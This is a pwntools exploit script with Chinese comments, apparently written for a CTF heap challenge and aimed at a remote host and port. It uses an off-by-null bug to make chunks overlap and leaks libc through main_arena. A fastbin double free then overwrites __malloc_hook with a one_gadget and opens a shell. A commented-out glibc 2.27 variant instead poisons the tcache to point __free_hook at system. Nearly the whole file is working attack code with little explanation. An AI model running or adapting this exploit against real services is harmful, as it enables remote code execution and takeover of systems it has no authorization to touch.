from pwn import *

context.log_level = 'DEBUG'

# elf = context.binary = ELF('../file/timu_2.27')
# p = process('../file/timu_2.27')
# libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

# elf = context.binary = ELF('../file/timu_2.23')
# p = process('../file/timu_2.23')
# libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

elf = context.binary = ELF('../file/timu_2.23')
p = remote('61.147.171.105', '63304')
libc = ELF('/mnt/d/security/libc6_2.23-0ubuntu10_amd64.so')

pause()

def create(size, data=b'a\n'):
    p.sendlineafter(b'choice :\n', b'1')
    p.sendlineafter(b'Size: \n', str(size).encode())
    p.sendafter(b'Data: \n', data)

def delete(index):
    p.sendlineafter(b'choice :\n', b'2')
    p.sendlineafter(b'Index: \n', str(index).encode())

def show():
    p.sendlineafter(b'choice :\n', b'3')

'''
glibc 2.27打法，这个版本进入unsorted bin需要大于0x410，而且Tcache构造时无需满足size需求
'''
# create(0x500) # 0
# create(0x600) # 1
# create(0x18) # 2
# create(0x500 - 0x10) # 3
# create(0x10) # 4

# delete(0) # 0 null
# delete(2) # 2 null

# prev_size = 0xb40
# create(0x18, b'a' * 0x10 + p64(prev_size)) # 0 -> off by null导致下一块P位变成0
# delete(3) # 3 null -> 0，1，2，3指针对应的块都并入unsorted bin中，视作空闲块

# create(0x500) # 2 -> 1指针对应的块被视作空闲块，存入libc中main arena的地址
# show()

# p.recvuntil(b'1 : ')
# libc.address = u64(p.recv(6).ljust(8, b'\0')) - 4111520

# create(0x40) # 3 -> 3指针和1指针相同
# delete(3) # 3 null -> tcache指向3
# delete(1) # 1 null -> tcache指向1，且1和3相同

# create(0x40, p64(libc.sym['__free_hook'] - 0x8) + b'\n') # 1 -> 写入下一个空闲块的地址，造成任意地址写
# create(0x40) # 3
# create(0x40, b'/bin/sh\0' + p64(libc.sym['system']) + b'\n') # 5 -> 5指向我们之前指定的地址，我们将其改写为system地址

# delete(5) # 5 null -> 触发free('/bin/sh')

# -------------------------------------分割线--------------------------------------------


'''
glibc 2.23打法，这个版本进入unsorted bin需要大于0x80，而且构造fastbin块时需要满足size需求
'''
create(0x100)
create(0x60)
create(0x68)
create(0x100-0x10)
create(0x10)

delete(0)
delete(2)

prev_size = 0x110 + 0x70 + 0x70
create(0x68, b'a'*0x60 + p64(prev_size)) # 0 -> 因为off by null，3指针对应的块大小应该是0x100的倍数
delete(3) # 0，1，2指针对应的块都被并入unsorted bin

create(0x100) # 2 -> 1指针对应的块作为unsorted bin的头部，会写入main arena的地址
show()

p.recvuntil(b'1 : ')
main_arena88 = u64(p.recv(6).ljust(8, b'\0'))
malloc_hook = (main_arena88 & 0xfffffffffffff000) + (libc.sym['__malloc_hook'] & 0xfff)
libc.address = malloc_hook - libc.sym['__malloc_hook']

create(0x60) # 3 -> 3指针和1指针指向同一块
create(0x60) # 5 -> 绕过double free检测，再创建一块，对应下标5
delete(3)
delete(5)
delete(1) # fastbin -> 1 -> 5 -> 3，其中3和1是同一块

# 由于free_hook附近全是0，无法伪造size，在malloc_hook附件找到0x0000007f，可以使用
create(0x60, p64(libc.sym['__malloc_hook'] - 0x23) + b'\n') # 1
create(0x60) # 3 -> 取出5
create(0x60) # 5 -> 取出3，现在空闲块指向我们设定的地址

# one_gadget = libc.address + 0xf03a4 # 本地
one_gadget = libc.address + 0x4526a # 远程
create(0x60, b'a' * 0x13 + p64(one_gadget) + b'\n') # 6

# 触发double free清空栈让one_gadget的条件得到满足
delete(0) # start + 0x110 + 0x60
delete(3) # start + 0x110 + 0x60

p.interactive()
